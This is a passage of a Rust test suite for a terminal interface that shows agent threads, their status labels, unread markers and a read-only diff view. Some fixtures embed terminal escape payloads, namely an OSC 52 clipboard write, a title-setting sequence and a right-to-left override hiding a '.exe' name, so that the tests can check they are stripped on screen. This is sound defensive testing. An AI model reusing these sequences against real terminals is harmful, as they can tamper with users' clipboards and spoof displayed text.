    let mut r: ThreadRow = parse(fake::fixture("live-threads.json")["threads"][1].clone());
    r.turn = turn.map(str::to_string);
    r.ship = ship.map(str::to_string);
    r.waiting = waiting;
    r.ended = ended;
    r
}

#[test]
fn each_thread_state_has_its_own_place_and_word() {
    use toolroll_tui::app::Section::{NeedsYou, Recent, Working};
    use toolroll_tui::thread::thread_place;
    // (turn, ship, questions waiting, ended) → unseen, then seen.
    type Place = (toolroll_tui::app::Section, &'static str);
    type Case = (
        Option<&'static str>,
        Option<&'static str>,
        i64,
        bool,
        Place,
        Place,
    );
    let table: &[Case] = &[
        // A question or permission always needs you, read or not.
        (
            Some("running"),
            None,
            1,
            false,
            (NeedsYou, "Question"),
            (NeedsYou, "Question"),
        ),
        (
            Some("finished"),
            Some("merged"),
            2,
            false,
            (NeedsYou, "Question"),
            (NeedsYou, "Question"),
        ),
        // A running thread is Working, never "Thread".
        (
            Some("running"),
            None,
            0,
            false,
            (Working, "Working"),
            (Working, "Working"),
        ),
        (
            Some("admitted"),
            None,
            0,
            false,
            (Working, "Working"),
            (Working, "Working"),
        ),
        (
            Some("finished"),
            Some("armed"),
            0,
            false,
            (Working, "Shipping"),
            (Working, "Shipping"),
        ),
        // News needs you once, then sits in Recent.
        (
            Some("finished"),
            None,
            0,
            false,
            (NeedsYou, "Ready"),
            (Recent, "Ready"),
        ),
        (
            Some("finished"),
            Some("merged"),
            0,
            false,
            (NeedsYou, "Ready"),
            (Recent, "Ready"),
        ),
        // Unknown, stopped and ended are three states.
        (
            Some("unknown"),
            None,
            0,
            false,
            (NeedsYou, "Outcome unknown"),
            (Recent, "Outcome unknown"),
        ),
        (
            Some("interrupted"),
            None,
            0,
            false,
            (NeedsYou, "Stopped"),
            (Recent, "Stopped"),
        ),
        (
            Some("unknown"),
            None,
            0,
            true,
            (Recent, "Ended"),
            (Recent, "Ended"),
        ),
        // A refused or stopped Ship says so (never plain Ready), unless the newest turn's own end says more.
        (
            Some("finished"),
            Some("cancelled"),
            0,
            false,
            (NeedsYou, "Ship stopped"),
            (Recent, "Ship stopped"),
        ),
        (
            Some("finished"),
            Some("refused"),
            0,
            false,
            (NeedsYou, "Ship refused"),
            (Recent, "Ship refused"),
        ),
        (
            Some("finished"),
            Some("failed"),
            0,
            false,
            (NeedsYou, "Ship refused"),
            (Recent, "Ship refused"),
        ),
        (
            Some("interrupted"),
            Some("refused"),
            0,
            false,
            (NeedsYou, "Stopped"),
            (Recent, "Stopped"),
        ),
    ];
    for (turn, ship, waiting, ended, unseen, seen) in table {
        let r = row(*turn, *ship, *waiting, *ended);
        assert_eq!(
            thread_place(&r, false),
            *unseen,
            "{turn:?} {ship:?} {waiting} {ended} unseen"
        );
        assert_eq!(
            thread_place(&r, true),
            *seen,
            "{turn:?} {ship:?} {waiting} {ended} seen"
        );
    }
    // A merged Ship reads Merged as its Ship outcome, apart from the thread's own state.
    assert_eq!(
        toolroll_tui::thread::ship_outcome(Some("merged")),
        Some("Ship: Merged")
    );
    assert_eq!(toolroll_tui::thread::ship_outcome(Some("refused")), None);
    assert_eq!(
        toolroll_tui::thread::turn_status_words("unknown"),
        "outcome unknown"
    );
}

#[test]
fn a_finished_turn_needs_you_with_a_dot_until_looked_at_once_then_moves_to_recent_and_a_new_one_is_news_again(
) {
    let mut app = thread_app(window());
    // Selected now: the fixture's first thread (a question waiting). The second finished a turn, unseen.
    let second = "0a9b8c7d6e5f40312a3b4c5d6e7f8091";
    let placed = |app: &App| {
        app.all_items
            .iter()
            .find(|i| i.id == second)
            .map(|i| (i.section, i.word.clone()))
    };
    assert_eq!(
        placed(&app),
        Some((toolroll_tui::app::Section::NeedsYou, "Ready".to_string()))
    );
    assert!(app.unread.contains(second));
    // Counted with Work's own rows: the top bar, the jump and the window title agree.
    let needs = app
        .all_items
        .iter()
        .filter(|i| i.section == toolroll_tui::app::Section::NeedsYou)
        .count() as i64;
    assert!(needs >= 2);
    let work_needs = app
        .all_items
        .iter()
        .filter(|i| !i.thread && i.section == toolroll_tui::app::Section::NeedsYou)
        .count() as i64;
    assert_eq!(app.needs_count, work_needs + 2, "{needs}");
    // Looked at once: selecting it clears the dot and moves it to Recent, and nothing was answered or sent.
    let at = app
        .items
        .iter()
        .position(|i| i.id == second)
        .expect("listed");
    let mut sent = vec![];
    while app.selected_item().map(|i| i.id.as_str()) != Some(second) {
        sent.extend(app.key(key(if app.selected < at { 'j' } else { 'k' })));
    }
    // The selection follows it to where it now sits.
    assert_eq!(app.selected_item().map(|i| i.id.as_str()), Some(second));
    assert!(
        sent.iter()
            .all(|e| !matches!(e, Effect::Act { .. } | Effect::Send { .. })),
        "{sent:?}"
    );
    assert!(!app.unread.contains(second));
    assert_eq!(
        placed(&app),
        Some((toolroll_tui::app::Section::Recent, "Ready".to_string()))
    );
    assert_eq!(app.needs_count, work_needs + 1);
    // Kept in the workbench's own view state.
    assert!(app
        .view_now()
        .thread_seen
        .iter()
        .any(|(id, _)| id == second));
    // The question waiting on the first thread still needs you, read or not.
    assert!(app
        .all_items
        .iter()
        .any(|i| i.id == fake::THREAD && i.section == toolroll_tui::app::Section::NeedsYou));
    // A new finished turn is news again.
    let mut list = fake::fixture("live-threads.json");
    list["threads"][1]["turnSeq"] = json!(2);
    app.update(Msg::Threads(Ok(parse(list))));
    assert_eq!(
        placed(&app).map(|p| p.0),
        Some(toolroll_tui::app::Section::Recent),
        "the one being looked at is seen at once"
    );
    // …unless the person is elsewhere when it lands.
    while app.selected > 0 {
        app.key(key('k'));
    }
    let mut list = fake::fixture("live-threads.json");
    list["threads"][1]["turnSeq"] = json!(3);
    app.update(Msg::Threads(Ok(parse(list))));
    if app.selected_item().map(|i| i.id.as_str()) != Some(second) {
        assert_eq!(
            placed(&app).map(|p| p.0),
            Some(toolroll_tui::app::Section::NeedsYou)
        );
        assert!(app.unread.contains(second));
    }
}

#[test]
fn the_newest_turns_stop_comes_before_an_older_ships_words() {
    let mut w = window();
    w["thread"]["version"] = json!("3333333333333333");
    w["thread"]["questions"] = json!([]);
    w["thread"]["turn"]["status"] = json!("interrupted");
    w["thread"]["turn"]["endWords"] = json!(
        "Your Claude sign-in for threads was removed. Add one again, then reply to continue."
    );
    w["thread"]["ship"] =
        json!({ "seq": 1, "state": "refused", "words": "An older Ship was refused." });
    let facts: ThreadFacts = parse(w["thread"].clone());
    let note = toolroll_tui::thread::end_note(Some(&facts), 200);
    assert_eq!(note[0], "Toolroll: Your Claude sign-in for threads was removed. Add one again, then reply to continue.");
    assert_eq!(
        note.get(1).map(String::as_str),
        Some("An older Ship was refused.")
    );
    // An unknown outcome is never "ended": it says to check the activity.
    w["thread"]["turn"]["status"] = json!("unknown");
    w["thread"]["turn"]["endWords"] = Value::Null;
    let facts: ThreadFacts = parse(w["thread"].clone());
    assert!(toolroll_tui::thread::end_note(Some(&facts), 200)[0]
        .starts_with("Toolroll: Outcome unknown:"));
    assert!(toolroll_tui::thread::end_note(Some(&facts), 200)[0].ends_with("Check its activity."));
}

#[test]
fn a_second_ship_refusal_on_the_same_turn_is_news_again() {
    let mut app = thread_app(window());
    let second = "0a9b8c7d6e5f40312a3b4c5d6e7f8091";
    let placed = |app: &App| {
        app.all_items
            .iter()
            .find(|i| i.id == second)
            .map(|i| (i.section, i.word.clone()))
    };
    let refused = |ship_seq: i64| {
        let mut list = fake::fixture("live-threads.json");
        list["threads"][1]["ship"] = json!("refused");
        list["threads"][1]["shipSeq"] = json!(ship_seq);
        list
    };
    let go_to = |app: &mut App, id: &str| {
        for _ in 0..app.items.len() * 2 {
            if app.selected_item().map(|i| i.id.as_str()) == Some(id) {
                return;
            }
            let at = app.items.iter().position(|i| i.id == id).expect("listed");
            app.key(key(if app.selected < at { 'j' } else { 'k' }));
        }
        panic!("couldn't select {id}");
    };
    // The first refusal lands while the person is on another thread: news, with a dot.
    app.update(Msg::Threads(Ok(parse(refused(1)))));
    assert_eq!(
        placed(&app),
        Some((
            toolroll_tui::app::Section::NeedsYou,
            "Ship refused".to_string()
        ))
    );
    assert!(app.unread.contains(second));
    // Read once: Recent.
    go_to(&mut app, second);
    assert_eq!(
        placed(&app).map(|p| p.0),
        Some(toolroll_tui::app::Section::Recent)
    );
    // Ship again without a new turn, from elsewhere; it is refused too: the same turn, the same state, another Ship.
    go_to(&mut app, fake::THREAD);
    app.update(Msg::Threads(Ok(parse(refused(2)))));
    assert_eq!(
        placed(&app),
        Some((
            toolroll_tui::app::Section::NeedsYou,
            "Ship refused".to_string()
        ))
    );
    assert!(app.unread.contains(second));
}

// ---- a thread as a conversation, with its own changes -------------------------------------------------------------

#[test]
fn the_persons_own_messages_show_in_the_transcript_marked_as_theirs_and_drawn_inert() {
    let mut w = window();
    w["window"]["records"]
        .as_array_mut()
        .unwrap()
        .insert(0, json!({ "k": "you", "at": "2026-11-15T10:02:10.000Z", "t": ["Make the totals include tax\u{1b}]52;c;ZXZpbA==\u{7}", "and keep the tests green"] }));
    let mut app = thread_app(w);
    let shown = screen(&mut app, 120, 44);
    let you = shown
        .lines()
        .position(|l| l.contains("You "))
        .unwrap_or_else(|| panic!("{shown}"));
    assert!(
        shown
            .lines()
            .nth(you + 1)
            .is_some_and(|l| l.contains("Make the totals include tax")),
        "{shown}"
    );
    assert!(shown.contains("and keep the tests green"), "{shown}");
    assert!(
        !shown.contains('\u{1b}') && !shown.contains('\u{7}'),
        "{shown}"
    );
    // Theirs comes before the agent's words, as it was said.
    let agent = shown
        .lines()
        .position(|l| l.contains("The totals test fails"))
        .unwrap();
    assert!(you < agent, "{shown}");
}

fn thread_diff(problem: Option<&str>) -> Value {
    let mut d = fake::fixture("result-diff.json");
    d["task"] = json!(fake::THREAD);
    d["run"] = json!(3);
    d["files"][0]["path"] = json!("src/to\u{1b}[31mtal.ts");
    if let Some(p) = problem {
        d["files"] = json!([]);
        d["problem"] = json!(p);
    }
    d
}

#[test]
fn a_thread_has_a_diff_tab_its_changes_read_only_and_drawn_inert() {
    let mut app = thread_app(window());
    app.focus = toolroll_tui::app::Focus::Detail;
    let mut fx = vec![];
    while app.tab != toolroll_tui::app::Tab::Diff {
        fx = app.key(KeyEvent::new(KeyCode::Tab, KeyModifiers::NONE));
    }
    // Its own road, never a task's (which refused it: "Couldn't read the changes (task)").
    let ask = fx
        .iter()
        .find_map(|e| match e {
            Effect::FetchThreadDiff(a) if a.task == fake::THREAD => Some(a.clone()),
            _ => None,
        })
        .unwrap_or_else(|| panic!("{fx:?}"));
    assert!(
        !fx.iter().any(|e| matches!(e, Effect::FetchDiff(_))),
        "{fx:?}"
    );
    let fx = app.update(Msg::Diff(ask, Ok(parse(thread_diff(None)))));
    let file = fx
        .iter()
        .find_map(|e| match e {
            Effect::FetchThreadDiffFile(a) if a.task == fake::THREAD && a.file == 0 => {
                Some(a.clone())
            }
            _ => None,
        })
        .unwrap_or_else(|| panic!("{fx:?}"));
    let mut hunks = fake::fixture("result-diff-file.json");
    hunks["task"] = json!(fake::THREAD);
    hunks["run"] = json!(3);
    hunks["file"]["hunks"][0]["lines"][2]["text"] =
        json!("  return sum(items) + tax(items); \u{1b}]0;owned\u{7}\u{202e}gnp.exe");
    app.update(Msg::DiffFile(file, Ok(parse(hunks))));
    let shown = screen(&mut app, 120, 30);
    assert!(
        shown.contains("Changes since the thread started"),
        "{shown}"
    );
    assert!(shown.contains("return sum(items) + tax(items);"), "{shown}");
    assert!(
        !shown.contains('\u{1b}') && !shown.contains('\u{7}') && !shown.contains('\u{202e}'),
        "{shown}"
    );
    // Read-only: no notes and no more lines here; what to change goes to the agent as a reply.
    assert_eq!(app.key(key('c')), vec![]);
    assert!(
        app.status
            .as_ref()
            .is_some_and(|(t, w)| *t == Tone::Refused && w.contains("read-only")),
        "{:?}",
        app.status
    );
    assert_eq!(app.key(key('e')), vec![]);
    // Esc leaves it, as a task's.
    app.key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE));
    assert_ne!(app.tab, toolroll_tui::app::Tab::Diff);
}

#[test]
fn a_thread_with_nothing_committed_says_so_on_its_diff_tab() {
    let mut app = thread_app(window());
    app.focus = toolroll_tui::app::Focus::Detail;
    let mut fx = vec![];
    while app.tab != toolroll_tui::app::Tab::Diff {
        fx = app.key(KeyEvent::new(KeyCode::Tab, KeyModifiers::NONE));
    }
    let Some(Effect::FetchThreadDiff(ask)) = fx
        .iter()
        .find(|e| matches!(e, Effect::FetchThreadDiff(_)))
        .cloned()
    else {
        panic!("{fx:?}")
    };
    app.update(Msg::Diff(ask, Ok(parse(thread_diff(Some("No committed changes yet. Ask the agent to commit its work: Ship sends committed work only."))))));
    let shown = screen(&mut app, 120, 30);
    assert!(shown.contains("No committed changes yet."), "{shown}");
}
